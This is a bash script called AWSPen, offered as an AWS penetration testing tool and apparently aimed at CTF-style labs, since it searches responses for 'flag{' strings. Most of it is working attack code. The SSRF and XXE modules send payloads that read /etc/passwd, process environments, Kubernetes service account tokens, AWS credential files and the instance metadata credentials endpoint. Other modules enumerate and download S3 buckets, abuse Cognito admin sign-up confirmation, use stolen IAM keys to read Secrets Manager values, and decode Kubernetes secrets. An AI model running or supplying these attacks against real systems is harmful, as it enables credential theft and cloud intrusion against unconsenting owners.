#!/bin/bash

# ╔═══════════════════════════════════════════════════════════════╗
# ║                        AWSPen v1.0                           ║
# ║           AWS Penetration Testing Automation Tool            ║
# ║                   github.com/burakkorkmaz                    ║
# ╚═══════════════════════════════════════════════════════════════╝

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
MODULES_DIR="$SCRIPT_DIR/modules"
OUTPUT_DIR="$SCRIPT_DIR/output"
mkdir -p "$OUTPUT_DIR"

banner() {
  echo -e "${CYAN}"
  echo '     █████╗ ██╗    ██╗███████╗██████╗ ███████╗███╗   ██╗'
  echo '    ██╔══██╗██║    ██║██╔════╝██╔══██╗██╔════╝████╗  ██║'
  echo '    ███████║██║ █╗ ██║███████╗██████╔╝█████╗  ██╔██╗ ██║'
  echo '    ██╔══██║██║███╗██║╚════██║██╔═══╝ ██╔══╝  ██║╚██╗██║'
  echo '    ██║  ██║╚███╔███╔╝███████║██║     ███████╗██║ ╚████║'
  echo '    ╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝'
  echo -e "${NC}"
  echo -e "${BOLD}        AWS Penetration Testing Automation Tool${NC}"
  echo -e "${YELLOW}                  v1.0 by burak korkmaz${NC}"
  echo ""
}

usage() {
  banner
  echo -e "${BOLD}USAGE:${NC}"
  echo "  ./awspen.sh --module <module> [options]"
  echo ""
  echo -e "${BOLD}MODULES:${NC}"
  echo -e "  ${GREEN}recon${NC}       Reconnaissance & content discovery"
  echo -e "  ${GREEN}s3${NC}          S3 bucket enumeration & misconfiguration check"
  echo -e "  ${GREEN}ssrf${NC}        SSRF exploitation (file:// & metadata)"
  echo -e "  ${GREEN}xxe${NC}         XXE injection & file read"
  echo -e "  ${GREEN}cognito${NC}     AWS Cognito misconfiguration check"
  echo -e "  ${GREEN}iam${NC}         IAM enumeration with stolen credentials"
  echo -e "  ${GREEN}k8s${NC}         Kubernetes service account token exploitation"
  echo -e "  ${GREEN}all${NC}         Run all modules sequentially"
  echo ""
  echo -e "${BOLD}EXAMPLES:${NC}"
  echo "  ./awspen.sh --module recon --target https://example.com"
  echo "  ./awspen.sh --module s3 --bucket mybucket --region ap-south-1"
  echo "  ./awspen.sh --module ssrf --url https://api.example.com/file --token abc123"
  echo "  ./awspen.sh --module xxe --url https://api.example.com/data"
  echo "  ./awspen.sh --module cognito --target https://auth.example.com"
  echo "  ./awspen.sh --module iam --key AKIA... --secret ... --session-token ..."
  echo "  ./awspen.sh --module k8s --token eyJ... --api-server https://cluster.eks.amazonaws.com"
  echo ""
}

log_info()    { echo -e "${BLUE}[*]${NC} $1"; }
log_success() { echo -e "${GREEN}[+]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error()   { echo -e "${RED}[-]${NC} $1"; }
log_flag()    { echo -e "${YELLOW}${BOLD}[FLAG]${NC} $1"; }
log_creds()   { echo -e "${RED}${BOLD}[CREDS]${NC} $1"; }

save_output() {
  local module=$1
  local content=$2
  local outfile="$OUTPUT_DIR/${module}_$(date +%Y%m%d_%H%M%S).txt"
  echo "$content" >> "$outfile"
  log_info "Output saved to: $outfile"
}

# ─────────────────────────────────────────────
# MODULE: RECON
# ─────────────────────────────────────────────
module_recon() {
  echo -e "\n${BOLD}${CYAN}═══ MODULE: RECONNAISSANCE ═══${NC}\n"

  local target=""
  while [[ $# -gt 0 ]]; do
    case $1 in
      --target) target=$2; shift 2 ;;
      *) shift ;;
    esac
  done

  if [[ -z "$target" ]]; then
    log_error "Usage: --module recon --target https://example.com"
    exit 1
  fi

  local domain=$(echo "$target" | sed 's|https\?://||' | cut -d'/' -f1)
  log_info "Target: $target"
  log_info "Domain: $domain"

  # robots.txt
  echo -e "\n${BOLD}[1] Checking robots.txt...${NC}"
  local robots=$(curl -s --max-time 10 "$target/robots.txt")
  if [[ -n "$robots" ]]; then
    log_success "robots.txt found:"
    echo "$robots" | while IFS= read -r line; do echo "    $line"; done
    echo "$robots" | grep -i "disallow\|allow" | grep -v "^$" | while IFS= read -r line; do
      path=$(echo "$line" | awk '{print $2}')
      log_warning "Interesting path: $path"
    done
  else
    log_warning "robots.txt not found or empty"
  fi

  # HTTP Headers
  echo -e "\n${BOLD}[2] Analyzing HTTP headers...${NC}"
  local headers=$(curl -sI --max-time 10 "$target")
  echo "$headers" | grep -i "server\|x-powered-by\|x-amz\|cf-ray\|via\|x-cache" | while IFS= read -r line; do
    log_success "Header: $line"
  done

  # DNS CNAME (S3 detection)
  echo -e "\n${BOLD}[3] DNS enumeration...${NC}"
  local cname=$(dig CNAME "$domain" +short 2>/dev/null)
  if [[ -n "$cname" ]]; then
    log_success "CNAME: $cname"
    if echo "$cname" | grep -q "amazonaws.com"; then
      log_success "AWS S3 bucket detected!"
      local region=$(echo "$cname" | grep -oP 'ap-\w+-\d+|us-\w+-\d+|eu-\w+-\d+')
      [[ -n "$region" ]] && log_success "Region: $region"
    fi
  fi

  # JavaScript files
  echo -e "\n${BOLD}[4] Fetching and analyzing JavaScript files...${NC}"
  local js_files=$(curl -s --max-time 10 "$target" | grep -oP 'src="[^"]+\.js[^"]*"' | grep -oP '"[^"]+"' | tr -d '"')
  if [[ -n "$js_files" ]]; then
    while IFS= read -r jsfile; do
      if [[ "$jsfile" == http* ]]; then
        js_url="$jsfile"
      else
        js_url="$target/$jsfile"
      fi
      log_info "Fetching: $js_url"
      local js_content=$(curl -s --max-time 10 "$js_url")
      echo "$js_content" | grep -oiE '(/[a-z0-9_/-]+){2,}' | sort -u | while IFS= read -r ep; do
        log_success "Endpoint found: $ep"
      done
      echo "$js_content" | grep -iE 'secret|password|key|token|api_key' | grep -v "^//" | while IFS= read -r match; do
        log_warning "Sensitive keyword: $match"
      done
    done <<< "$js_files"
  else
    log_warning "No JavaScript files found in page source"
  fi

  # Common paths
  echo -e "\n${BOLD}[5] Checking common sensitive paths...${NC}"
  local paths=("/.env" "/config.php" "/aws.php" "/admin" "/api" "/swagger" "/docs" "/api-docs" "/graphql" "/server-status" "/.git/config")
  for path in "${paths[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$target$path")
    if [[ "$status" == "200" || "$status" == "301" || "$status" == "302" || "$status" == "403" ]]; then
      log_success "[$status] $target$path"
    fi
  done
}

# ─────────────────────────────────────────────
# MODULE: S3
# ─────────────────────────────────────────────
module_s3() {
  echo -e "\n${BOLD}${CYAN}═══ MODULE: S3 BUCKET ENUMERATION ═══${NC}\n"

  local bucket="" region="us-east-1" key="" secret="" enumerate_names=false base_name=""
  while [[ $# -gt 0 ]]; do
    case $1 in
      --bucket) bucket=$2; shift 2 ;;
      --region) region=$2; shift 2 ;;
      --key) key=$2; shift 2 ;;
      --secret) secret=$2; shift 2 ;;
      --enumerate) enumerate_names=true; base_name=$2; shift 2 ;;
      *) shift ;;
    esac
  done

  if [[ -z "$bucket" && "$enumerate_names" == false ]]; then
    log_error "Usage: --module s3 --bucket <name> [--region <region>] [--key <key> --secret <secret>]"
    log_error "       --module s3 --enumerate <base-name> [--region <region>]"
    exit 1
  fi

  # Set credentials if provided
  if [[ -n "$key" && -n "$secret" ]]; then
    export AWS_ACCESS_KEY_ID="$key"
    export AWS_SECRET_ACCESS_KEY="$secret"
    export AWS_DEFAULT_REGION="$region"
    log_info "Using provided AWS credentials"
  fi

  # Enumerate naming conventions
  if [[ "$enumerate_names" == true ]]; then
    log_info "Enumerating naming conventions for base: $base_name"
    local envs=("prod" "dev" "staging" "test" "beta" "alpha" "uat" "qa")
    for env in "${envs[@]}"; do
      local try_bucket="${base_name}-${env}"
      result=$(aws s3 ls "s3://$try_bucket" 2>&1)
      if [[ ! "$result" == *"NoSuchBucket"* && ! "$result" == *"AccessDenied"* ]]; then
        log_success "FOUND: s3://$try_bucket"
        echo "$result"
      elif [[ "$result" == *"AccessDenied"* ]]; then
        log_warning "EXISTS but AccessDenied: s3://$try_bucket"
      fi

      # Also try with domain suffix
      local try_bucket2="${base_name}-${env}.${base_name}.com"
      result2=$(aws s3 ls "s3://$try_bucket2" 2>&1)
      if [[ ! "$result2" == *"NoSuchBucket"* && ! "$result2" == *"AccessDenied"* ]]; then
        log_success "FOUND: s3://$try_bucket2"
      fi
    done
    return
  fi

  log_info "Target bucket: s3://$bucket"
  log_info "Region: $region"

  # Check public access (no credentials)
  echo -e "\n${BOLD}[1] Checking public access (no credentials)...${NC}"
  local public_result=$(aws s3 ls "s3://$bucket" --no-sign-request 2>&1)
  if [[ ! "$public_result" == *"AccessDenied"* && ! "$public_result" == *"NoSuchBucket"* ]]; then
    log_success "Bucket is PUBLICLY ACCESSIBLE!"
    echo "$public_result"
  else
    log_warning "Bucket requires authentication or does not exist"
  fi

  # Check with credentials
  echo -e "\n${BOLD}[2] Checking with credentials...${NC}"
  local auth_result=$(aws s3 ls "s3://$bucket" 2>&1)
  if [[ ! "$auth_result" == *"AccessDenied"* && ! "$auth_result" == *"NoSuchBucket"* ]]; then
    log_success "Bucket accessible with credentials!"
    echo "$auth_result"
  else
    log_error "Cannot access bucket: $auth_result"
    return
  fi

  # Look for sensitive files
  echo -e "\n${BOLD}[3] Looking for sensitive files...${NC}"
  local all_files=$(aws s3 ls "s3://$bucket" --recursive 2>/dev/null)
  echo "$all_files" | grep -iE "secret|flag|password|credential|key|config|backup|\.env" | while IFS= read -r line; do
    log_warning "Interesting file: $line"
    filepath=$(echo "$line" | awk '{print $4}')
    log_info "Downloading: $filepath"
    aws s3 cp "s3://$bucket/$filepath" "$OUTPUT_DIR/" 2>/dev/null
    cat "$OUTPUT_DIR/$(basename $filepath)" 2>/dev/null | while IFS= read -r fline; do
      if echo "$fline" | grep -qiE "flag\{|AKIA|password|secret"; then
        log_flag "$fline"
      fi
    done
  done

  # Check bucket ACL and policy
  echo -e "\n${BOLD}[4] Checking bucket security settings...${NC}"
  aws s3api get-bucket-acl --bucket "$bucket" 2>/dev/null && log_warning "ACL is accessible"
  aws s3api get-bucket-policy --bucket "$bucket" 2>/dev/null && log_warning "Bucket policy is accessible"
}

# ─────────────────────────────────────────────
# MODULE: SSRF
# ─────────────────────────────────────────────
module_ssrf() {
  echo -e "\n${BOLD}${CYAN}═══ MODULE: SSRF EXPLOITATION ═══${NC}\n"

  local url="" token="" header="authorizationToken" param="fileName" method="POST"
  while [[ $# -gt 0 ]]; do
    case $1 in
      --url) url=$2; shift 2 ;;
      --token) token=$2; shift 2 ;;
      --header) header=$2; shift 2 ;;
      --param) param=$2; shift 2 ;;
      --method) method=$2; shift 2 ;;
      *) shift ;;
    esac
  done

  if [[ -z "$url" ]]; then
    log_error "Usage: --module ssrf --url <endpoint> [--token <token>] [--header <header-name>] [--param <param-name>]"
    exit 1
  fi

  local auth_header=""
  [[ -n "$token" ]] && auth_header="-H \"$header: $token\""

  log_info "Target: $url"
  log_info "Auth header: $header"
  log_info "Param name: $param"

  local targets=(
    "file:///proc/self/environ"
    "file:///etc/passwd"
    "file:///etc/secret.txt"
    "file:///var/run/secrets/kubernetes.io/serviceaccount/token"
    "file:///root/.aws/credentials"
    "http://169.254.169.254/latest/meta-data/"
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    "http://169.254.170.2/v2/credentials"
  )

  for target_path in "${targets[@]}"; do
    echo -e "\n${BOLD}[*] Testing: $target_path${NC}"

    local response
    if [[ -n "$token" ]]; then
      response=$(curl -s --max-time 10 -X "$method" "$url" \
        -H "$header: $token" \
        -H "Content-Type: application/json" \
        -d "{\"$param\": \"$target_path\"}" 2>&1)
    else
      response=$(curl -s --max-time 10 -X "$method" "$url" \
        -H "Content-Type: application/json" \
        -d "{\"$param\": \"$target_path\"}" 2>&1)
    fi

    if [[ -n "$response" && ! "$response" == *"error"* && ! "$response" == *"Error"* ]] || \
       echo "$response" | grep -qiE "AWS_|flag\{|root:|Bearer ey"; then
      log_success "SSRF successful for: $target_path"
      echo "$response" | tr '\0' '\n'

      # Extract AWS credentials
      if echo "$response" | grep -q "AWS_ACCESS_KEY_ID"; then
        log_creds "AWS Credentials found!"
        echo "$response" | tr '\0' '\n' | grep -oE 'AWS_ACCESS_KEY_ID=[^&\s]+' | while IFS= read -r cred; do
          log_creds "$cred"
        done
        echo "$response" | tr '\0' '\n' | grep -oE 'AWS_SECRET_ACCESS_KEY=[^&\s]+' | while IFS= read -r cred; do
          log_creds "$cred"
        done
        echo "$response" | tr '\0' '\n' | grep -oE 'AWS_SESSION_TOKEN=[^&\s]+' | head -c 200
      fi

      # Extract flags
      if echo "$response" | grep -q "flag{"; then
        local flag=$(echo "$response" | grep -oE 'flag\{[^}]+\}')
        log_flag "$flag"
      fi

      # Extract K8s token
      if echo "$response" | grep -qE "^eyJ|Bearer eyJ"; then
        log_creds "Kubernetes service account token found!"
        local k8s_token=$(echo "$response" | grep -oE 'eyJ[A-Za-z0-9._-]+')
        echo "$k8s_token" | head -c 100
        echo "..."
      fi
    else
      log_warning "No useful response for: $target_path"
    fi
  done
}

# ─────────────────────────────────────────────
# MODULE: XXE
# ─────────────────────────────────────────────
module_xxe() {
  echo -e "\n${BOLD}${CYAN}═══ MODULE: XXE INJECTION ═══${NC}\n"

  local url="" tag="name" wrapper="" token="" header="authorizationToken"
  while [[ $# -gt 0 ]]; do
    case $1 in
      --url) url=$2; shift 2 ;;
      --tag) tag=$2; shift 2 ;;
      --token) token=$2; shift 2 ;;
      --header) header=$2; shift 2 ;;
      *) shift ;;
    esac
  done

  if [[ -z "$url" ]]; then
    log_error "Usage: --module xxe --url <endpoint> [--tag <xml-tag>] [--token <token>]"
    exit 1
  fi

  log_info "Target: $url"

  local file_targets=(
    "file:///etc/passwd"
    "file:///etc/secret.txt"
    "file:///proc/self/environ"
    "file:///var/run/secrets/kubernetes.io/serviceaccount/token"
    "file:///var/run/secrets/kubernetes.io/serviceaccount/namespace"
    "file:///root/.aws/credentials"
  )

  for file_path in "${file_targets[@]}"; do
    echo -e "\n${BOLD}[*] Testing XXE: $file_path${NC}"

    local xxe_payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"$file_path\">]>
<data>
    <dataEntry type=\"test\" id=\"1\">
        <$tag>&xxe;</$tag>
        <value>test</value>
    </dataEntry>
</data>"

    local response
    if [[ -n "$token" ]]; then
      response=$(curl -s --max-time 10 -X POST "$url" \
        -H "$header: $token" \
        -H "Content-Type: application/xml" \
        -d "$xxe_payload" 2>&1)
    else
      response=$(curl -s --max-time 10 -X POST "$url" \
        -H "Content-Type: application/xml" \
        -d "$xxe_payload" 2>&1)
    fi

    if [[ -n "$response" ]] && echo "$response" | grep -qvE "error|Error|exception|Exception|denied|Denied"; then
      log_success "XXE successful for: $file_path"
      echo "$response"

      if echo "$response" | grep -q "flag{"; then
        local flag=$(echo "$response" | grep -oE 'flag\{[^}]+\}')
        log_flag "$flag"
      fi

      if echo "$response" | grep -q "AWS_ACCESS_KEY_ID"; then
        log_creds "AWS Credentials found in environment!"
      fi

      if echo "$response" | grep -qE "^eyJ"; then
        log_creds "Kubernetes token found!"
      fi
    else
      log_warning "No XXE response or access denied for: $file_path"
    fi
  done
}

# ─────────────────────────────────────────────
# MODULE: COGNITO
# ─────────────────────────────────────────────
module_cognito() {
  echo -e "\n${BOLD}${CYAN}═══ MODULE: COGNITO MISCONFIGURATION ═══${NC}\n"

  local target="" username="awspen_$(date +%s)" password="AwsPen@$(date +%s)" email=""
  while [[ $# -gt 0 ]]; do
    case $1 in
      --target) target=$2; shift 2 ;;
      --username) username=$2; shift 2 ;;
      --password) password=$2; shift 2 ;;
      --email) email=$2; shift 2 ;;
      *) shift ;;
    esac
  done

  if [[ -z "$target" ]]; then
    log_error "Usage: --module cognito --target https://auth.example.com"
    exit 1
  fi

  [[ -z "$email" ]] && email="${username}@gmail.com"
  log_info "Target: $target"
  log_info "Test username: $username"

  # Check if signup is available
  echo -e "\n${BOLD}[1] Testing self-registration...${NC}"
  local signup_response=$(curl -s --max-time 10 -X POST "$target/signup.php" \
    -d "username=$username&email=$email&password=$password&action=register")

  log_info "Signup response:"
  echo "$signup_response" | grep -i "cognito\|error\|success\|region\|pool" | head -20

  # Extract Cognito region from error messages
  local region=$(echo "$signup_response" | grep -oE 'cognito-idp\.[a-z0-9-]+\.amazonaws\.com' | grep -oE '[a-z0-9]+-[a-z0-9]+-[0-9]+')
  if [[ -n "$region" ]]; then
    log_success "Cognito region detected: $region"
  fi

  # Try incorrect confirmation code to get error (reveals region)
  echo -e "\n${BOLD}[2] Probing verification endpoint...${NC}"
  local verify_response=$(curl -s --max-time 10 -X POST "$target/verify.php" \
    -d "username=$username&confirmation=000000&action=confirm")

  echo "$verify_response" | grep -i "cognito\|error\|region\|pool\|client" | head -20

  local region2=$(echo "$verify_response" | grep -oE 'cognito-idp\.[a-z0-9-]+\.amazonaws\.com' | grep -oE '[a-z0-9]+-[a-z0-9]+-[0-9]+')
  [[ -n "$region2" ]] && log_success "Confirmed Cognito region: $region2" && region="$region2"

  # If we have the region, try to list user pools
  if [[ -n "$region" ]]; then
    echo -e "\n${BOLD}[3] Attempting to enumerate Cognito user pools (region: $region)...${NC}"
    local pools=$(aws cognito-idp list-user-pools --max-results 10 --region "$region" 2>&1)
    if [[ ! "$pools" == *"AccessDenied"* ]]; then
      log_success "User pools found!"
      echo "$pools"
      local pool_id=$(echo "$pools" | grep -oE '[a-z0-9_-]+_[A-Za-z0-9]+' | head -1)
      if [[ -n "$pool_id" ]]; then
        log_success "Pool ID: $pool_id"
        log_info "Attempting admin-confirm-sign-up for: $username"
        aws cognito-idp admin-confirm-sign-up \
          --user-pool-id "$pool_id" \
          --username "$username" \
          --region "$region" 2>&1 && log_success "User confirmed!"
      fi
    else
      log_warning "Cannot list user pools (AccessDenied)"
      log_info "Manual step: Find User Pool ID in JS files or page source"
      log_info "Then run: aws cognito-idp admin-confirm-sign-up --user-pool-id <ID> --username $username --region $region"
    fi
  fi

  log_info "Test credentials: $username / $password"
}

# ─────────────────────────────────────────────
# MODULE: IAM
# ─────────────────────────────────────────────
module_iam() {
  echo -e "\n${BOLD}${CYAN}═══ MODULE: IAM ENUMERATION ═══${NC}\n"

  local key="" secret="" session_token="" region="us-east-1"
  while [[ $# -gt 0 ]]; do
    case $1 in
      --key) key=$2; shift 2 ;;
      --secret) secret=$2; shift 2 ;;
      --session-token) session_token=$2; shift 2 ;;
      --region) region=$2; shift 2 ;;
      *) shift ;;
    esac
  done

  if [[ -z "$key" || -z "$secret" ]]; then
    log_error "Usage: --module iam --key <key> --secret <secret> [--session-token <token>] [--region <region>]"
    exit 1
  fi

  export AWS_ACCESS_KEY_ID="$key"
  export AWS_SECRET_ACCESS_KEY="$secret"
  export AWS_DEFAULT_REGION="$region"
  [[ -n "$session_token" ]] && export AWS_SESSION_TOKEN="$session_token"

  echo -e "\n${BOLD}[1] Identity check...${NC}"
  local identity=$(aws sts get-caller-identity 2>&1)
  if [[ "$identity" == *"UserId"* ]]; then
    log_success "Valid credentials!"
    echo "$identity"
    local role_name=$(echo "$identity" | grep -oE 'assumed-role/[^/]+' | cut -d'/' -f2)
    [[ -n "$role_name" ]] && log_success "Role name: $role_name"
  else
    log_error "Invalid or expired credentials"
    return
  fi

  echo -e "\n${BOLD}[2] Enumerating accessible services...${NC}"

  declare -A checks=(
    ["S3 Buckets"]="aws s3 ls"
    ["Secrets Manager"]="aws secretsmanager list-secrets --region $region"
    ["Lambda Functions"]="aws lambda list-functions --region $region"
    ["EC2 Instances"]="aws ec2 describe-instances --region $region --query 'Reservations[].Instances[].{ID:InstanceId,State:State.Name,IP:PublicIpAddress}'"
    ["IAM Users"]="aws iam list-users"
    ["IAM Roles"]="aws iam list-roles --query 'Roles[].RoleName'"
    ["EKS Clusters"]="aws eks list-clusters --region $region"
    ["SSM Parameters"]="aws ssm describe-parameters --region $region"
    ["RDS Instances"]="aws rds describe-db-instances --region $region"
  )

  for service in "${!checks[@]}"; do
    echo -e "\n  ${BOLD}[$service]${NC}"
    result=$(eval "${checks[$service]}" 2>&1)
    if [[ "$result" == *"AccessDenied"* ]]; then
      log_warning "AccessDenied"
    elif [[ -z "$result" || "$result" == "[]" || "$result" == "{}" ]]; then
      log_warning "Empty (no resources or no access)"
    else
      log_success "Accessible!"
      echo "$result" | head -20
    fi
  done

  # Try to read secrets
  echo -e "\n${BOLD}[3] Attempting to read secrets...${NC}"
  local secret_list=$(aws secretsmanager list-secrets --region "$region" 2>/dev/null)
  if [[ -n "$secret_list" ]]; then
    echo "$secret_list" | grep -oE '"Name": "[^"]+"' | cut -d'"' -f4 | while IFS= read -r secret_name; do
      log_info "Trying to read: $secret_name"
      local secret_val=$(aws secretsmanager get-secret-value --secret-id "$secret_name" --region "$region" 2>&1)
      if [[ ! "$secret_val" == *"AccessDenied"* ]]; then
        log_success "Secret value retrieved: $secret_name"
        echo "$secret_val"
        echo "$secret_val" | grep -oE 'flag\{[^}]+\}' | while IFS= read -r flag; do
          log_flag "$flag"
        done
      fi
    done
  fi
}

# ─────────────────────────────────────────────
# MODULE: KUBERNETES
# ─────────────────────────────────────────────
module_k8s() {
  echo -e "\n${BOLD}${CYAN}═══ MODULE: KUBERNETES TOKEN EXPLOITATION ═══${NC}\n"

  local token="" api_server="" namespace="default"
  while [[ $# -gt 0 ]]; do
    case $1 in
      --token) token=$2; shift 2 ;;
      --api-server) api_server=$2; shift 2 ;;
      --namespace) namespace=$2; shift 2 ;;
      *) shift ;;
    esac
  done

  if [[ -z "$token" || -z "$api_server" ]]; then
    log_error "Usage: --module k8s --token <jwt> --api-server https://cluster.eks.amazonaws.com [--namespace default]"
    exit 1
  fi

  log_info "API Server: $api_server"
  log_info "Namespace: $namespace"

  # Decode JWT
  echo -e "\n${BOLD}[1] Decoding service account token...${NC}"
  local payload=$(echo "$token" | cut -d'.' -f2 | base64 -d 2>/dev/null)
  if [[ -n "$payload" ]]; then
    log_success "Token payload:"
    echo "$payload" | python3 -m json.tool 2>/dev/null || echo "$payload"
    local sa_name=$(echo "$payload" | grep -oE '"name": "[^"]+"' | head -1 | cut -d'"' -f4)
    [[ -n "$sa_name" ]] && log_success "Service account name: $sa_name"
  fi

  # Test API access
  echo -e "\n${BOLD}[2] Testing Kubernetes API access...${NC}"
  local api_test=$(curl -sk --max-time 10 -H "Authorization: Bearer $token" "$api_server/api/v1/" 2>&1)
  if [[ "$api_test" == *"APIResourceList"* || "$api_test" == *"resources"* ]]; then
    log_success "Kubernetes API accessible!"
  else
    log_error "Cannot access Kubernetes API"
    return
  fi

  # List resources
  local resources=("secrets" "pods" "configmaps" "serviceaccounts")
  for resource in "${resources[@]}"; do
    echo -e "\n${BOLD}[3] Listing $resource in namespace: $namespace...${NC}"
    local result=$(curl -sk --max-time 10 \
      -H "Authorization: Bearer $token" \
      "$api_server/api/v1/namespaces/$namespace/$resource" 2>&1)

    if [[ "$result" == *"items"* ]]; then
      log_success "$resource found!"
      local names=$(echo "$result" | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data.get('items', []):
    print(item['metadata']['name'])
" 2>/dev/null)
      echo "$names" | while IFS= read -r name; do
        log_info "  → $name"
      done

      # If secrets, decode and look for flags
      if [[ "$resource" == "secrets" ]]; then
        echo "$result" | python3 -c "
import sys, json, base64
data = json.load(sys.stdin)
for item in data.get('items', []):
    name = item['metadata']['name']
    print(f'Secret: {name}')
    for k, v in item.get('data', {}).items():
        try:
            decoded = base64.b64decode(v).decode('utf-8', errors='replace')
            print(f'  {k}: {decoded}')
        except:
            print(f'  {k}: {v}')
" 2>/dev/null | while IFS= read -r line; do
          if echo "$line" | grep -qE "flag\{|AKIA|password|secret|key"; then
            log_flag "$line"
          else
            echo "  $line"
          fi
        done
      fi
    else
      log_warning "Cannot list $resource (forbidden or empty)"
    fi
  done
}

# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
if [[ $# -eq 0 ]]; then
  usage
  exit 0
fi

MODULE=""
ARGS=()

while [[ $# -gt 0 ]]; do
  case $1 in
    --module) MODULE=$2; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) ARGS+=("$1"); shift ;;
  esac
done

banner

case $MODULE in
  recon)   module_recon "${ARGS[@]}" ;;
  s3)      module_s3 "${ARGS[@]}" ;;
  ssrf)    module_ssrf "${ARGS[@]}" ;;
  xxe)     module_xxe "${ARGS[@]}" ;;
  cognito) module_cognito "${ARGS[@]}" ;;
  iam)     module_iam "${ARGS[@]}" ;;
  k8s)     module_k8s "${ARGS[@]}" ;;
  all)
    log_info "Running all modules..."
    log_warning "Please use individual modules with appropriate targets"
    usage
    ;;
  "")
    log_error "No module specified. Use --module <module>"
    usage
    exit 1
    ;;
  *)
    log_error "Unknown module: $MODULE"
    usage
    exit 1
    ;;
esac
